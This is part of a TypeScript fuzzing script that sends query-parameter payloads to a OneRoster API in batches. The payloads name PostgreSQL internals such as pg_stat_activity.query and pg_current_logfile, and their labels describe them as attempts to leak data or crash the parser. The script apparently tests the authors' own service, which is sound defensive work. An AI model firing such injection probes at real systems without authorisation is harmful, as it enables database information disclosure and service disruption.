	{ type: "sort", value: "current_setting.param", description: "CRITICAL [500]: Attempt current_setting for leak" },
	{ type: "sort", value: "pg_conf_load_time.time", description: "CRITICAL [500]: Attempt pg_conf_load_time" },
	{ type: "sort", value: "pg_current_logfile.path", description: "CRITICAL [500]: Attempt pg_current_logfile" },
	{ type: "sort", value: "pg_backend_pid.pid", description: "CRITICAL [500]: Attempt pg_backend_pid" },
	{ type: "sort", value: "pg_my_temp_schema.schema", description: "CRITICAL [500]: Attempt pg_my_temp_schema" },
	{
		type: "sort",
		value: "pg_is_other_temp_schema.schema",
		description: "CRITICAL [500]: Attempt pg_is_other_temp_schema"
	},
	{ type: "sort", value: "pg_timezone_names.name", description: "CRITICAL [500]: Attempt pg_timezone_names" },
	{ type: "sort", value: "pg_stat_activity.query", description: "CRITICAL [500]: Attempt pg_stat_activity for queries" }
]

// --- Zod Schema for Auth Response ---
const OneRosterTokenResponseSchema = z.object({
	access_token: z.string().min(1)
})

// ANSI colors for logging
const C = {
	Reset: "\x1b[0m",
	Bright: "\x1b[1m",
	Red: "\x1b[31m",
	Green: "\x1b[32m",
	Yellow: "\x1b[33m",
	Cyan: "\x1b[36m"
}

/**
 * A simple, self-contained client to get an auth token and make requests.
 */
class BombardClient {
	#accessToken: string | null = null
	#tokenPromise: Promise<string> | null = null

	async #getAccessToken(): Promise<string> {
		logger.debug("client: fetching new access token")
		const params = new URLSearchParams({
			grant_type: "client_credentials",
			client_id: env.TIMEBACK_CLIENT_ID,
			client_secret: env.TIMEBACK_CLIENT_SECRET
		})

		const result = await errors.try(
			fetch(env.TIMEBACK_TOKEN_URL, {
				method: "POST",
				headers: { "Content-Type": "application/x-www-form-urlencoded" },
				body: params
			})
		)
		if (result.error) {
			logger.error("client auth: token fetch failed", { error: result.error })
			throw errors.wrap(result.error, "client token fetch")
		}

		if (!result.data.ok) {
			const errorBody = await result.data.text()
			logger.error("client auth: token request rejected", { status: result.data.status, body: errorBody })
			throw errors.new(`client token request failed with status ${result.data.status}`)
		}

		const jsonResult = await errors.try(result.data.json())
		if (jsonResult.error) {
			logger.error("client auth: failed to parse token response", { error: jsonResult.error })
			throw errors.wrap(jsonResult.error, "client token response parsing")
		}

		const validation = OneRosterTokenResponseSchema.safeParse(jsonResult.data)
		if (!validation.success) {
			logger.error("client auth: invalid token response schema", { error: validation.error })
			throw errors.wrap(validation.error, "client token response validation")
		}

		logger.info("client: access token acquired successfully")
		return validation.data.access_token
	}

	async #ensureAccessToken(): Promise<void> {
		if (this.#accessToken) return
		if (this.#tokenPromise) {
			this.#accessToken = await this.#tokenPromise
			return
		}
		this.#tokenPromise = this.#getAccessToken()
		const tokenResult = await errors.try(this.#tokenPromise)
		this.#tokenPromise = null
		if (tokenResult.error) {
			logger.error("token acquisition failed", { error: tokenResult.error })
			throw tokenResult.error
		}
		this.#accessToken = tokenResult.data
	}

	async sendRequest(url: string): Promise<Response> {
		await this.#ensureAccessToken()
		return fetch(url, {
			headers: {
				Authorization: `Bearer ${this.#accessToken}`
			}
		})
	}
}

async function main() {
	logger.info("--- Starting OneRoster Parser Bombardment Script ---")
	const client = new BombardClient()
	let totalSent = 0
	let successes = 0
	let clientErrors = 0
	let serverErrors = 0

	const bombard = async (payload: (typeof PAYLOADS)[0], index: number) => {
		const url = new URL(env.TIMEBACK_ONEROSTER_SERVER_URL)
		url.pathname = TARGET_ENDPOINT_PATH

		// All our new payloads are simple filter/sort
		url.searchParams.set(payload.type, payload.value)

		const urlString = url.toString()

		const result = await errors.try(client.sendRequest(urlString))
		totalSent++

		if (result.error) {
			logger.error("request failed to send", { index: index + 1, error: result.error })
			serverErrors++
			return
		}

		const response = result.data
		const status = response.status

		let logColor = C.Reset
		if (status >= 500) {
			serverErrors++
			logColor = C.Red
		} else if (status >= 400) {
			clientErrors++
			logColor = C.Yellow
		} else {
			successes++
			logColor = C.Green
		}

		const responseBody = await response.text()
		const bodySnippet = responseBody.length > 300 ? `${responseBody.substring(0, 300)}...` : responseBody

		process.stdout.write(
			`${C.Bright}[${index + 1}/${PAYLOADS.length}] ${payload.description}${C.Reset}\n` +
				`  ${C.Cyan}URL: ${urlString}${C.Reset}\n` +
				`  ${logColor}└── STATUS: ${status}${C.Reset}\n` +
				`  ${logColor}    └── BODY: ${bodySnippet.replace(/\n/g, "\n            ")}${C.Reset}\n\n`
		)
	}

	for (let i = 0; i < PAYLOADS.length; i += CONCURRENT_REQUESTS) {
		const batch = PAYLOADS.slice(i, i + CONCURRENT_REQUESTS)
		await Promise.all(batch.map((p, j) => bombard(p, i + j)))
	}

	logger.info("--- Bombardment Complete ---")
	logger.info("Summary:", {
		totalPayloads: PAYLOADS.length,
		requestsSent: totalSent,
		successes: `${C.Green}${successes}${C.Reset}`,
		clientErrors: `${C.Yellow}${clientErrors}${C.Reset}`,
		serverErrors: `${C.Red}${serverErrors}${C.Reset}`
	})
	logger.info(
		"Review the logs above for detailed responses. Look for 5xx server errors, which indicate successful crashes or unhandled exceptions, and 4xx client errors which can indicate information disclosure."
	)

	if (serverErrors > 0) {
		logger.error("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
		logger.error("!!! The parser is not safe for production. See 500 errors above.       !!!")
		logger.error("!!! A rewrite using a formal grammar is the only secure path forward.  !!!")
		logger.error("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
	} else if (clientErrors > 0) {
		logger.warn(
			"Potential vulnerabilities detected: The parser returned client errors, which is expected for some tests. However, review logs for any unexpected 4xx responses or verbose error messages that might leak internal implementation details."
		)
	} else {
		logger.info(
			"No server-crashing vulnerabilities were found with this test set. It is still recommended to replace the hand-rolled parser with a robust, grammar-based solution to prevent future bugs."
		)
	}
}

// --- Script Entry Point ---
const result = await errors.try(main())
if (result.error) {
	logger.error("script failed with a critical unhandled error", { error: result.error })
	process.exit(1)
}
